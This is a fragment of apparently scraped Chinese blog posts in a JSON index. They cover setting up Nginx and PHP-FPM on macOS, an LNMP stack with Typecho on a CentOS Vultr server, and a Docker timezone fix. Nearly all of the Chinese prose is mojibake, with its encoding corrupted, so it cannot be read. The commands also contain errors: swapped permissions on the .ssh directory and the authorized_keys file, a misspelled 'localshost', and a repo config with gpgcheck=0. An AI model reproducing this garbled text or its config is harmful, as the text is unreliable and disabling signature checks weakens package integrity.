file '/private/etc/php-fpm.conf' é”™è¯¯ä¿¡æ¯æ˜¾ç¤ºï¼Œä¸èƒ½æ‰“å¼€é…ç½®æ–‡ä»¶ï¼Œcd /private/etcï¼Œå‘ç°æ²¡æœ‰ php-fpm.confæ–‡ä»¶ï¼Œä½†æ˜¯æœ‰php-fpm.conf.defaultæ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶æ˜¯é»˜è®¤é…ç½®ï¼Œæˆ‘ä»¬å¯ä»¥å¤åˆ¶ä¸€ä»½ï¼Œæ”¹åä¸ºphp-fpm.confï¼Œç„¶åå†æ ¹æ®éœ€è¦æ”¹åŠ¨é…ç½®ã€‚\n$ sudo cp /private/etc/php-fpm.conf.default /private/etc/php-fpm.conf å†æ‰§è¡Œphp-fpm\n$ php-fpm ERROR: failed to open error_log (/usr/var/log/php-fpm.log): No such file or directory (2) ERROR: failed to post process the configuration ERROR: FPM initialization failed é”™è¯¯ä¿¡æ¯æ˜¾ç¤ºï¼Œä¸èƒ½æ‰“å¼€é”™è¯¯æ—¥å¿—æ–‡ä»¶ã€‚cd /usr/var/logå‘ç°æ ¹æœ¬æ²¡æœ‰è¿™ä¸ªç›®å½•ï¼Œç”šè‡³è¿varç›®å½•éƒ½æ²¡æœ‰ï¼ŒåŠ ä¸Šä¸ºäº†é¿å…æƒé™é—®é¢˜ï¼Œå¹²è„†é…ç½®åˆ° /usr/local/var/logç›®å½•ã€‚\nä¿®æ”¹php-fpm.confä¸­error_log é…ç½®ä¸º /usr/local/var/log/php-fpm.logï¼Œå¹¶æŠŠ user å’Œ group æ”¹ä¸ºå’Œå½“å‰ç”¨æˆ·ä¸€æ ·ã€‚\n; Error log file ; If it's set to \u0026quot;syslog\u0026quot;, log is sent to syslogd instead of being written ; in a local file. ; Note: the default prefix is /usr/var ; Default Value: log/php-fpm.log error_log = /usr/local/var/log/php-fpm.log ... ; Unix user/group of processes ; Note: The user is mandatory. If the group is not set, the default user's group ; will be used. user = xxx(å½“å‰ç”¨æˆ·) group = xxx(å½“å‰ç”¨æˆ·ç»„) æ€ä¹ˆæŸ¥çœ‹å½“å‰ç”¨æˆ·ä»¥åŠ\u0008æ‰€å±ç»„å‘¢ï¼Ÿå‚è€ƒé“¾æ¥\n$ who //æŸ¥çœ‹å½“å‰ç™»é™†çš„ç”¨æˆ· $ finger //ç”¨äºæŸ¥æ‰¾å¹¶æ˜¾ç¤ºç”¨æˆ·ä¿¡æ¯ $ finger xxx //æŸ¥çœ‹ç”¨æˆ·çš„ä¿¡æ¯ $ groups xxx //æŸ¥çœ‹ç”¨æˆ·æ‰€å±ç»„åˆ« æ‰§è¡Œ php-fpmï¼Œå†æ¬¡æŠ¥é”™ï¼š\n$ php-fpm NOTICE: [pool www] 'user' directive is ignored when FPM is not running as root NOTICE: [pool www] 'group' directive is ignored when FPM is not running as root äºæ˜¯ç”¨sudo php-fpmï¼Œå†æ¬¡æŠ¥é”™ï¼š\n$ sudo php-fpm ERROR: unable to bind listening socket for address '127.0.0.1:9000': Address already in use (48) ERROR: FPM initialization failed ç¼–è¾‘php-fpm.confï¼Œä¿®æ”¹listenä¸º127.0.0.1:9999ã€‚ \u0008å…·ä½“ä¹Ÿå¯ä»¥å‚è€ƒMacå¦‚ä½•æŸ¥çœ‹ç«¯å£å ç”¨\nå…¶å®åæ¥é€šè¿‡æ£€æŸ¥ç«¯å£ï¼Œå‘ç°å½“æ—¶å ç”¨çš„ä¹Ÿæ˜¯php-fpmï¼Œä¹Ÿæœ‰ç‚¹\u0008ç–‘æƒ‘ã€‚\nå¯ä»¥ç”¨è¿‡sudo pkill php-fpmå…³é—­php-fpm\n$ sudo pkill php-fpm \u0008æœ€å\nphp-fpm -t [04-Mar-2018 01:56:01] NOTICE: configuration file /private/etc/php-fpm.conf test is successful 0x4 é…ç½®Nginx.conf nginx.confçš„é…ç½®è¿˜æ˜¯\u0008ç›¸å½“é‡è¦çš„ï¼Œæ¯•ç«Ÿæ˜¯nginxçš„é…ç½®\u0008æ–‡ä»¶\nç½‘ä¸Š\u0008ä¹ŸæŒºå¤šå‚è€ƒé“¾æ¥\né¦–å…ˆï¼Œæ‰¾åˆ°serverçš„locationé…ç½®ï¼Œç»™indexåŠ ä¸€ä¸ªindex.php\nlocation / { root html; index index.html index.htm index.php; } ç„¶åé…ç½®ç«¯å£ï¼Œæˆ‘æ”¹æˆäº†80ç«¯å£ï¼Œä½†æ˜¯æ¯æ¬¡å¯åŠ¨éƒ½éœ€è¦sudo\nserver { listen 80; server_name localhost; æ¥ç€å»æ‰phpç›¸å…³çš„æ³¨é‡Šï¼Œå¹¶ä¿®æ”¹ fastcgi_param å‚æ•°\n- fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; + fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; æ‰€ä»¥å®Œæ•´\u0008phpé…ç½®ä¸º\n# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # location ~ \\.php$ { root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } é‡å¯Nginx\n$ sudo nginx -s reload 0x5 BrBrBr å¥½å•¦ï¼Œå¯ä»¥å¼€å¿ƒåœ°è¿›è¡Œå¼€å‘å•¦ï¼\n","date":"2018-03-04T02:22:00Z","permalink":"https://blog.zeddyu.info/2018/03/04/MacOS-X-%E4%B8%8B%E9%85%8D%E7%BD%AENginx-amp-PHP/","title":"MacOS X ä¸‹é…ç½®Nginx \u0026amp; PHP"},{"content":"æ„Ÿè§‰è¿˜æ˜¯è‡ªå·±æ­ä¸ªæœåŠ¡å™¨æ¯”è¾ƒå¥½ã€‚ä¹‹å‰æ˜¯å¤§ä¸€ä¸‹å­¦æœŸå°±æƒ³æ­äº†çš„ï¼Œåªæ˜¯å½“æ—¶å¥½åƒå·²ç»å¼€å§‹å®è¡Œäº†åŸŸåå¤‡æ¡ˆæªæ–½ï¼Œæ±Ÿè‹å¤‡æ¡ˆè¿˜è¦æš‚ä½è¯ï¼Œå°±æ²¡å»å¼„äº†ï¼Œæ„Ÿè§‰è‡ªå·±ç”¨ipå¼„åšå®¢å¤ªå‚»äº†ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¸€ç›´ç”¨ä¹‹å‰åœ¨æŸä¸ªåšå®¢ç³»ç»Ÿä¸Šçš„åšå®¢ã€‚é‚£ä¸ªåšå®¢ä¹Ÿæœ‰å¾ˆå¤šè‡ªå·±å†™çš„ä¸œè¥¿ï¼Œè€Œä¸”æœ‰äº›è¿˜è§ä¸å¾—äººçš„ä¸œè¥¿-\u0026gt;_-\u0026gt;\næ‰€ä»¥è¿™ç¯‡å°±ç”¨æ¥è®°å½•ä¸€ä¸‹å°±æ­å»ºæœåŠ¡å™¨çš„ä¸€äº›å‘\næœåŠ¡å™¨ç”¨çš„æ˜¯çš„vultræä¾›çš„ï¼ŒåŸŸågodaddyã€‚ç³»ç»Ÿcentos 7.2\n0x0 \u0008ä¸€å¼€å§‹Vultré€‰å¥½æœåŠ¡å™¨ä»¥åï¼Œä¼šæœ‰ä¸ªStartup Scriptçš„é€‰é¡¹ï¼Œè¿™ä¸ªé€‰é¡¹æ˜¯å¯ä»¥æ‰§è¡Œä¸€äº›æœåŠ¡å™¨å»ºå¥½ä»¥åè¿è¡Œçš„è„šæœ¬\n#!/bin/sh # NOTE: This is an example that sets up SSH authorization. To use it, you'd need to replace \u0026quot;ssh-rsa AA... youremail@example.com\u0026quot; with your SSH public. # You can replace this entire script with anything you'd like, there is no need to keep it mkdir -p /root/.ssh chmod 600 /root/.ssh echo ssh-rsa AA... youremail@example.com \u0026gt; /root/.ssh/authorized_keys chmod 700 /root/.ssh/authorized_keys è¿™æ˜¯Vultrç»™çš„ç¤ºä¾‹è„šæœ¬ç¤ºä¾‹ã€‚è¿™æ ·å­çš„è¯ï¼Œæ¯æ¬¡å»ºæœåŠ¡å™¨åªéœ€è¦ä½ å†™å¥½è„šæœ¬å°±å¯ä»¥é…ç½®\u0008å¥½ä¸€äº›é€šç”¨çš„ç»„ä»¶äº†ï¼Œ\u0008ä¾‹å¦‚Nginxã€phpç­‰ã€‚\næˆ‘è‡ªå·±\u0008å†™çš„è„šæœ¬ä¸æ˜¯å¾ˆå¥½ï¼Œå°±ä¸æ”¾å‡ºæ¥äº†ã€‚\n0x1 ç„¶åå°±æ˜¯å…ˆå¼€å§‹é…ç½®nginxäº†\n1.æ·»åŠ Nginxåˆ°YUMæº æ·»åŠ CentOS 7 Nginx yumèµ„æºåº“,æ‰“å¼€ç»ˆç«¯,ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤:\nsudo rpm -Uvh http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm  ç„¶åä¸ºäº†æ˜¯æœ€æ–°ç¨³å®šçš„Nginxï¼Œåˆç‰¹åœ°å»ä¿®æ”¹äº†yumçš„nginx.repo\n[nginx] name=nginx repo baseurl=http://nginx.org/packages/mainline/OS/OSRELEASE/$basearch/ gpgcheck=0 enabled=1  æŒ‰ç…§\u0008å®˜æ–¹æ–‡æ¡£æ¥ä¿®æ”¹\n2.å¼€å§‹å®‰è£…Nginx åœ¨ä½ çš„CentOS 7 æœåŠ¡å™¨ä¸­ä½¿ç”¨yumå‘½ä»¤ä»NginxæºæœåŠ¡å™¨ä¸­è·å–æ¥å®‰è£…Nginxï¼š\nsudo yum install -y nginx  3.å¯åŠ¨Nginx åˆšå®‰è£…çš„Nginxä¸ä¼šè‡ªè¡Œå¯åŠ¨ã€‚è¿è¡ŒNginx:\nsudo systemctl start nginx.service  ç„¶åå¯ä»¥é€šè¿‡\ncurl localshost  æ¥æŸ¥çœ‹Nginxæ˜¯å¦å¯åŠ¨æˆåŠŸ\n4.CentOS 7 å¼€æœºå¯åŠ¨Nginx sudo systemctl enable nginx.service  5.\u0008ä¸€äº›Nginxçš„å¸¸ç”¨ç›®å½• ç½‘ç«™æ–‡ä»¶å­˜æ”¾é»˜è®¤ç›®å½•:\n/usr/share/nginx/html  ç½‘ç«™é»˜è®¤ç«™ç‚¹é…ç½®:\n/etc/nginx/conf.d/default.conf  è‡ªå®šä¹‰Nginxç«™ç‚¹é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•:\n/etc/nginx/conf.d/  Nginxå…¨å±€é…ç½®\n/etc/nginx/nginx.conf  6.\u0008æ³¨æ„äº‹é¡¹ æ¯”è¾ƒå‘çš„æ˜¯\u0008ä¸€å¼€å§‹æˆ‘åªæƒ³é…ä¸ªNginx\u0008ç„¶åé…åŸŸåè¯•è¯•èƒ½ä¸èƒ½è®¿é—®ï¼Œç»“æœ\u0008é…å¥½Nginxä¹‹åç›´æ¥è®¿é—®ipå‘ç°\u0008\u0008æ— æ³•\u0008è®¿é—®ã€‚ç„¶åè€ƒè™‘ipè¢«å¢™äº†ï¼Œä½†æ˜¯å§,pingäº†ipè¿˜æ˜¯èƒ½pingé€šçš„ï¼Œä½†æ˜¯æ— è®ºæŒ‚ä¸æŒ‚ä»£ç†éƒ½è¿˜æ˜¯ä¸èƒ½è®¿é—®ã€‚è¿™å°±æ¯”è¾ƒéƒé—·äº†ã€‚\nåæ¥ç»è¿‡æé†’ï¼Œç”¨ ss -tan æŸ¥çœ‹\u0008äº†ä¸€ä¸‹ç«¯å£\u0008ï¼Œå‘ç°80å·²ç»\u0008æ˜¯å¤„äºç›‘å¬\u0008çŠ¶æ€äº†ï¼Œè¿™å°±æ¯”è¾ƒå¥‡æ€ªäº†ï¼Œå†å»æ‰«äº†ä¸€ä¸‹æœåŠ¡å™¨çš„ç«¯å£ï¼Œ\u0008è¿™æ—¶å€™å‘ç°80ç«¯å£æ˜¯å…³é—­çš„ã€‚\nç™¾æ€ä¸å¾—å…¶è§£ï¼Œéš¾é“Vulträ¹Ÿæœ‰é˜¿é‡Œäº‘çš„é‚£ç§å®‰å…¨é˜²æŠ¤ï¼Œå¾—\u0008æ‰‹åŠ¨æ‰“å¼€ï¼Ÿ\n\u0008ç„¶åé—®äº†ä¸€ä¸‹å¤§ä½¬ï¼Œå°±å¯èƒ½æ˜¯é˜²ç«å¢™çš„\u0008é—®é¢˜äº†ã€‚\nCentosæ˜¯è‡ªå¸¦çš„firewall,iptables,ä½†æ˜¯iptablesè¿˜å¾—é…ç½®ï¼Œæˆ‘ä»¬å°±ä¸ç”¨iptablesäº†ï¼Œå°±ç”¨è‡ªå¸¦çš„firewalldäº†\nå¼€å§‹æ’æŸ¥é˜²ç«å¢™\nå…ˆçœ‹çœ‹80æ˜¯å¦å¼€å¯\nfirewall-cmd --query-port=80/tcp  æ˜¾ç¤º\nno  æœç„¶æ˜¯å› ä¸ºé˜²ç«å¢™å±è”½äº†80ç«¯å£ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡\nfirewall-cmd --zone=public --add-port=80/tcp --permanent  æ‰“å¼€80ç«¯å£ï¼Œ æ˜¾ç¤º\nsuccess  å³å¯å¼€å¯80ç«¯å£ï¼Œç„¶åé‡å¯é˜²ç«å¢™\nsystemctl [start|stop|restart] firewalld.service  ç»ˆäºå¯ä»¥çœ‹åˆ°ç†Ÿæ‚‰çš„Nginxç•Œé¢äº†ã€‚ \u0008\n0x2 æ¥ç€å°±æ˜¯MariaDB\n1.å®‰è£…: yum install mariadb mariadb-server  2.å¯åŠ¨ systemctl start mariadb  3.å¼€æœºå¯åŠ¨ systemctl enable mariadb  4.é…ç½®MariaDB mysql_secure_installation  5.æµ‹è¯• mysql -u root -p  0x3 å†è£…php\nVultræœ‰æ¯”è¾ƒè¯¦ç»†çš„å®‰è£…æ•™ç¨‹,æˆ‘å°±è´´å‡ºæ¥äº†ã€‚è¿™é‡Œè£…çš„æ˜¯php7.1\nç„¶åå†å®‰è£…ä¸ªphp-fpm\nyum install php71w-fpm  è¿™é‡Œæ³¨æ„çš„æ˜¯php7.1æ˜¯php71wçš„å‰ç¼€\næ¥ä¸‹æ¥è¿›å…¥Nginxçš„ç›®å½•é…ç½®nginx.confæˆ–è€…æ˜¯/conf.d/default.dï¼Œä¸€èˆ¬ç›®å½•æ˜¯åœ¨/etc/nginx/,æŠŠä¸‹é¢è¿™æ®µæ³¨é‡Šå–æ¶ˆå°±å¥½äº†ã€‚\u0008\nlocation ~ \\.php$ { root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; include fastcgi_params; }  å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæˆ‘åœ¨é…é˜¿é‡Œäº‘éƒ½æ²¡å‡ºç°åœ¨è¿‡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å°±æ˜¯é…Vultrå°±å‡ºç°äº†ä¸€äº›å‘\né¦–å…ˆæ˜¯å‡ºç°äº†\nconnect() failed (111: Connection refused) while connecting to upstream, server: localhost, request: \u0026quot;GET /xxx.php HTTP/1.1\u0026quot;, upstream: \u0026quot;fastcgi://127.0.0.1:9000\u0026quot;  è¿™ä¸ªå°±æ˜¯php-fpmå¿˜è®°å¼€äº†\nç„¶ååˆç¢°åˆ°äº†File Not Foundçš„é”™è¯¯,catäº†error.logçœ‹ä¸€ä¸‹:\nFastCGI sent in stderr: \u0026quot;Primary script unknown\u0026quot; while reading response header from upstream, server: localhost, request: \u0026quot;GET /test.php HTTP/1.1\u0026quot;, upstream: \u0026quot;fastcgi://127.0.0.1:9000\u0026quot;  è¿™å°±æ¯”è¾ƒéƒé—·äº†ï¼Œä¸è¿‡Googleè¿˜æ˜¯èƒ½æ‰¾åˆ°çš„ï¼Œåæ­£å°±æ˜¯è¯´File Not Foundï¼Œçœ‹äº†ä¸€ä¸‹åŸæ¥æ˜¯locationçš„rooté…ç½®é—®é¢˜ï¼Œ\nlocation ~ \\.php$ { root /usr/share/nginx/html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /$document_root$fastcgi_script_name; include fastcgi_params; }  ç‰¹åˆ«è¦æ³¨æ„rootæŒ‡å‘çš„ä½ç½®ï¼Œè¿™åˆæ˜¯æ¯”è¾ƒå‘çš„ä¸œè¥¿ã€‚\u0008\nç„¶åå°±æ˜¯å®‰è£…typechoçš„å‘äº†ã€‚\n0x4 è¿™é‡Œå°±ç®€å•æætypechoçš„å‘ã€‚ ç¬¬ä¸€ä¸ªå°±æ˜¯ä¸nginxçš„é…ç½®ï¼Œè¿™ä¸ªè¿˜å¥½æœ‰æ–‡æ¡£ï¼Œä½†æ˜¯åªèƒ½è§£å†³æˆ‘çš„\næ— æ³•ç™»å½•åå°ï¼Œç‚¹å‡»å‰å°é“¾æ¥æˆ–è€…åå°ç™»å½•æ—¶å‡ºç°\u0026quot;404, not found\u0026quot;  è¿™ä¸ªé—®é¢˜\n\u0008è¿˜æœ‰å‡ºç°çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯typechoçš„ç™»å½•302çš„é—®é¢˜ã€‚\nè¿˜å¥½æœ‰å¤§ä½¬ç›´æ¥ç»™äº†æˆ‘è§£å†³æ–¹æ¡ˆ:\nåœ¨config.inc.phpåŠ å…¥define('__TYPECHO_SECURE__',1);  åæ¥æŸ¥äº†ä¸€ä¸‹å‘ç°\u0008è¿™ä¸ªæ˜¯ç”¨æ¥å¼€å¯httpsè®¿é—®typechoçš„è®¾ç½®\n/** å¼€å¯HTTPS */ define('__TYPECHO_SECURE__',true);  å…·ä½“å¯ä»¥å‚ç…§ä¸€ä¸‹è¿™ç¯‡æ–‡ç« \nè¿˜æœ‰typecho\u0008ç‚¹å‡»è¯„è®ºç¡®\u0008æ— æ³•è¯„è®ºçš„é—®é¢˜ï¼Œåªè¦åœ¨typechoç®¡ç†å‘˜æ§åˆ¶å°ä¸­åœ¨æ°¸ä¹…é“¾æ¥ä¸­æŠŠè‡ªå®šä¹‰æ–‡ç« è·¯å¾„\u0008\né»˜è®¤æ˜¯\né»˜è®¤é£æ ¼ /archives/{cid}/  æ”¹æˆ\nwordpressé£æ ¼ /archives/{slug}.html  å…·ä½“åŸå› æ²¡æŸ¥ï¼Œæˆ‘çŒœ\u0008ä¹Ÿæ˜¯nginxä¸typechoçš„pathinfo\u0008é—®é¢˜\n0x5 è¿™ç¯‡æ–‡ç« ä¸»è¦å°±åˆ°è¿™å§ï¼Œ\u0008åç»­ä¼šå¢åŠ ä¸€äº›è‡ªå·±ä»¥åé‡åˆ°çš„é—®é¢˜\n","date":"2018-03-03T01:09:00Z","permalink":"https://blog.zeddyu.info/2018/03/03/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%9F%BA%E4%BA%8ELNMP/","title":"æœåŠ¡å™¨é…ç½®çš„é‚£äº›äº‹--åŸºäºLNMP"},{"content":"ä»Šå¤©åˆšåˆšå¼€å§‹åšPA0ï¼Œå‘ç°è‡ªå·±å¯¹Dockerçš„ç ”ç©¶ä¹Ÿä¸æ˜¯å¾ˆæ·±ï¼Œä¹Ÿå°±æ˜¯åœ¨èµ›å®çš„é‚£æ®µæ—¥å­ï¼Œç®—æ˜¯ä¸€ä¸ªå¥‘æœºå§ï¼Œè®©æˆ‘ä»¬ç”¨Dockeræ­æ¯”èµ›ç¯å¢ƒï¼Œé‚£ä¸ªæ—¶å€™å¼€å§‹æ¥è§¦çš„Dockerï¼Œç„¶åä¹Ÿè·ŸRexè¯·æ•™äº†æœ‰å…³Dockerçš„ä¸€äº›çŸ¥è¯†ã€‚è¿˜ä»¥ä¸ºç®—æ˜¯æ¯”è¾ƒäº†è§£Dockeräº†å§ï¼Œä»Šå¤©å‘ç°è‡ªå·±è¿˜æ˜¯èœçš„å‘€ã€‚\né¦–å…ˆä»Šå¤©å§ï¼ŒæŠŠDebiané•œåƒç»™å¼„å¥½äº†ï¼Œç„¶åè£…ä¸Šäº†oh my zshï¼Œç„¶åå‘ç°ä¸€ä¸ª\u0008æ˜¾ç¤ºæ—¶é—´æ¯”è¾ƒæ–¹ä¾¿çš„ä¸»é¢˜ï¼Œæˆ‘çš„Macæ˜¯agnosterçš„ä¸»é¢˜ï¼Œè¿˜æ˜¯æ¯”è¾ƒå¥½çœ‹çš„ã€‚ä½†æ˜¯ç”¨ä¹…äº†ä¹Ÿæƒ³åœ¨dockerä¸Šæ¢æ¢\u0008æ–°çš„æ¥ç”¨ç”¨ã€‚ä¹Ÿé€šè¿‡è¿™æ¬¡è¯¾æ­£å¼\u0008åœ°ç ”ç©¶ä¸€ä¸‹Dockerå§ã€‚\näºæ˜¯åœ¨ç”¨ysè¿™ä¸ªä¸»é¢˜çš„æ—¶å€™ï¼Œå‘ç°æ—¶é—´æ˜¯ä¸å¯¹çš„ã€‚è¿™ä¸ªåˆä¸æ˜¯æœåŠ¡å™¨\u0008ï¼Œæ‰€ä»¥æˆ‘è§‰å¾—è¿˜æ˜¯æœ‰é—®é¢˜çš„ï¼Œä¿æŒç€\u0008ç ”ç©¶é—®é¢˜çš„\u0008æ€åº¦çœ‹äº†ä¸€ä¸‹ã€‚\nDocker Debiané‡Œç”¨dateå‘½ä»¤çœ‹ä¸€ä¸‹\n# zedd @ c7c452f36fc4 in ~ [16:24:36] $ date Sat Jan 27 16:25:00 UTC 2018 ç„¶åæŸ¥äº†ä¸€ä¸‹ï¼Œå¾ˆå¿«å°±æ‰¾åˆ°äº†åŸæ¥æ˜¯æ—¶åŒºçš„é—®é¢˜ã€‚æˆ‘çš„Macä¸Šdateæ˜¯\nzedd@ZedddeMac / date 2018å¹´ 1æœˆ28æ—¥ æ˜ŸæœŸæ—¥ 00æ—¶43åˆ†52ç§’ CST å“ˆï¼Œåªè¦æ”¹æ”¹æ—¶åŒºåº”è¯¥å°±å¯ä»¥äº†ã€‚ä¸è¿‡ç½‘ä¸Šç»™çš„ç­”æ¡ˆå¥½åƒéƒ½æ¯”è¾ƒéº»çƒ¦ï¼Œæˆ‘Googleåˆ°çš„ç¬¬ä¸€æ¡\u0008ï¼Œä¿®æ”¹Dockerfileä¸ªäººè®¤ä¸ºæ˜¯ä¸€ä¸ªåœ¨åˆ›å»ºçš„æ—¶å€™ç”¨çš„ï¼Œè¿˜æœ‰å…¶ä»–çš„æ–¹æ³•å¯èƒ½\u0008éƒ¨åˆ†\u0008äººçœ‹ä¸æ‡‚ï¼Œè€Œä¸”æ ¼å¼ä¸å¤ªä¸€æ ·ã€‚\u0008æˆ‘æ„Ÿè§‰åº”è¯¥è¿˜æ˜¯æœ‰ç›´æ¥ä¿®æ”¹æ—¶åŒºçš„\u0008åŠæ³•çš„ï¼Œæ¯•ç«Ÿåœ¨GUIä¸‹è¿˜æ˜¯å¯ä»¥ä¿®æ”¹æ—¶åŒºæ—¶é—´çš„ã€‚\nä¸‹é¢ç»™å‡º\u0008ç›´æ¥çš„è§£å†³æ–¹æ¡ˆï¼ˆæ“ä½œ\u0008åœ¨Debian 9ä¸‹ï¼‰: ç›´æ¥ç”¨\ndpkg-reconfigure tzdata è‹¥\u0008command not foundï¼Œå¯ä»¥\ncd /usr/sbin sudo ./dpkg-reconfigure tzdata ç„¶åé€‰æ‹©ç›¸åº”çš„æ—¶åŒºä¸æ—¶é—´ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©äº†\n6. Asia 69. Shanghai å†ç”¨dateä¸€çœ‹ï¼Œå“ˆï¼Œå¥½äº†\n# zedd @ c7c452f36fc4 in /usr/sbin [0:55:52] $ date Sun Jan 28 00:56:14 CST 2018 é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œys\u0008ä¸»é¢˜ä¸Šçš„æ—¶é—´æ˜¯ä½ ä¸Šæ¬¡\u0008æ“ä½œç»“æŸçš„æ—¶é—´ã€‚ï¼ˆä¸»é¢˜ç”¨èµ·æ¥è¿˜æ˜¯ä¸é”™çš„ï¼Œå€¼å¾—æ¨èã€‚\næœ€åå†ç§‘æ™®ä¸€æ³¢\nä¸–ç•Œåè°ƒæ—¶é—´UTC å¤šæ•°çš„ä¸¤åœ°æ—¶é—´è¡¨éƒ½ä»¥GMTæ¥è¡¨ç¤ºï¼Œä½†ä¹Ÿæœ‰äº›ä¸¤åœ°æ—¶é—´è¡¨ä¸Šçœ‹ä¸åˆ°GMTå­—æ ·ï¼Œå‡ºç°çš„åè€Œæ˜¯UTCè¿™3ä¸ªè‹±æ–‡å­—æ¯ï¼Œç©¶ç«Ÿä½•è°“UTCï¼Ÿäº‹å®ä¸Šï¼ŒUTCæŒ‡çš„æ˜¯Coordinated Universal Timeï¼ ä¸–ç•Œåè°ƒæ—¶é—´ï¼ˆåˆç§°ä¸–ç•Œæ ‡å‡†æ—¶é—´ã€ä¸–ç•Œç»Ÿä¸€æ—¶é—´ï¼‰ï¼Œæ˜¯ç»è¿‡å¹³å‡å¤ªé˜³æ—¶(ä»¥æ ¼æ—å¨æ²»æ—¶é—´GMTä¸ºå‡†)ã€åœ°è½´è¿åŠ¨ä¿®æ­£åçš„æ–°æ—¶æ ‡ä»¥åŠä»¥ã€Œç§’ã€ä¸ºå•ä½çš„å›½é™…åŸå­æ—¶æ‰€ç»¼åˆç²¾ç®—è€Œæˆçš„æ—¶é—´ï¼Œè®¡ç®—è¿‡ç¨‹ç›¸å½“ä¸¥è°¨ç²¾å¯†ï¼Œå› æ­¤è‹¥ä»¥ã€Œä¸–ç•Œæ ‡å‡†æ—¶é—´ã€çš„è§’åº¦æ¥è¯´ï¼ŒUTCæ¯”GMTæ¥å¾—æ›´åŠ ç²¾å‡†ã€‚å…¶è¯¯å·®å€¼å¿…é¡»ä¿æŒåœ¨0.9ç§’ä»¥å†…ï¼Œè‹¥å¤§äº0.9ç§’åˆ™ç”±ä½äºå·´é»çš„å›½é™…åœ°çƒè‡ªè½¬äº‹åŠ¡ä¸­å¤®å±€å‘å¸ƒé—°ç§’ï¼Œä½¿UTCä¸åœ°çƒè‡ªè½¬å‘¨æœŸä¸€è‡´ã€‚æ‰€ä»¥åŸºæœ¬ä¸ŠUTCçš„æœ¬è´¨å¼ºè°ƒçš„æ˜¯æ¯”GMTæ›´ä¸ºç²¾ç¡®çš„ä¸–ç•Œæ—¶é—´æ ‡å‡†ï¼Œä¸è¿‡å¯¹äºç°è¡Œè¡¨æ¬¾æ¥è¯´ï¼ŒGMTä¸UTCçš„åŠŸèƒ½ä¸ç²¾ç¡®åº¦æ˜¯æ²¡æœ‰å·®åˆ«çš„ã€‚ å¤æ—¥èŠ‚çº¦æ—¶é—´DST æ‰€è°“ã€Œå¤æ—¥èŠ‚çº¦æ—¶é—´ã€Daylight Saving Timeï¼ˆç®€ç§°D.S.T.ï¼‰ï¼Œæ˜¯æŒ‡åœ¨å¤å¤©å¤ªé˜³å‡èµ·çš„æ¯”è¾ƒæ—©æ—¶ï¼Œå°†æ—¶é’Ÿæ‹¨å¿«ä¸€å°æ—¶ï¼Œä»¥ææ—©æ—¥å…‰çš„ä½¿ç”¨ï¼Œåœ¨è‹±å›½åˆ™ç§°ä¸ºå¤ä»¤æ—¶é—´(Summer Time)ã€‚è¿™ä¸ªæ„æƒ³äº1784å¹´ç”±ç¾å›½ç­æ°æ˜Â·å¯Œå…°å…‹æ—æå‡ºæ¥ï¼Œ1915å¹´å¾·å›½æˆä¸ºç¬¬ä¸€ä¸ªæ­£å¼å®æ–½å¤ä»¤æ—¥å…‰èŠ‚çº¦æ—¶é—´çš„å›½å®¶ï¼Œä»¥å‰Šå‡ç¯å…‰ç…§æ˜å’Œè€—ç”µå¼€æ”¯ã€‚è‡ªæ­¤ä»¥åï¼Œå…¨çƒä»¥æ¬§æ´²å’ŒåŒ—ç¾ä¸ºä¸»çš„çº¦70ä¸ªå›½å®¶éƒ½å¼•ç”¨è¿™ä¸ªåšæ³•ã€‚ç›®å‰è¢«åˆ’åˆ†æˆä¸¤ä¸ªæ—¶åŒºçš„å°åº¦ä¹Ÿæ­£åœ¨å•†è®¨æ˜¯å¦å…¨å›½è¯¥ç»Ÿä¸€å®è¡Œå¤ä»¤æ—¥å…‰èŠ‚çº¦æ—¶é—´ã€‚æ¬§æ´²æ‰‹æœºä¸Šä¹Ÿæœ‰å¾ˆå¤šGSMç³»ç»Ÿçš„åŸºåœ°å°ï¼Œé™¤äº†ä¼šä¼ é€å½“åœ°æ—¶é—´å¤–ä¹ŸåŒ…æ‹¬å¤ä»¤æ—¥å…‰èŠ‚çº¦æ—¶é—´ï¼Œåšä¸ºæ‰‹æœºçš„æ—¶é—´æ ‡å‡†ï¼Œä½¿ç”¨è€…å¯ä»¥è‡ªè¡Œå†³å®šè¦å¼€å¯æˆ–å…³é—­ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸäº›å›½å®¶æœ‰å®æ–½ã€Œå¤æ—¥èŠ‚çº¦æ—¶é—´ã€çš„åˆ¶åº¦ï¼Œå‡ºå›½æ—¶åˆ«å¿˜äº†è·Ÿéšå½“åœ°ä¹ æƒ¯åœ¨è¡¨ä¸Šè°ƒæ•´ä¸€ä¸‹ï¼Œè¿™å¯æ˜¯æœºæ¢°è¡¨æ²¡æœ‰çš„åŠŸèƒ½è®¾è®¡å“¦ï¼ CSTæ—¶é—´ CSTå´åŒæ—¶å¯ä»¥ä»£è¡¨å¦‚ä¸‹ 4 ä¸ªä¸åŒçš„æ—¶åŒºï¼š Central Standard Time (USA) UT-6:00 Central Standard Time (Australia) UT+9:30 China Standard Time UT+8:00 Cuba Standard Time UT-4:00 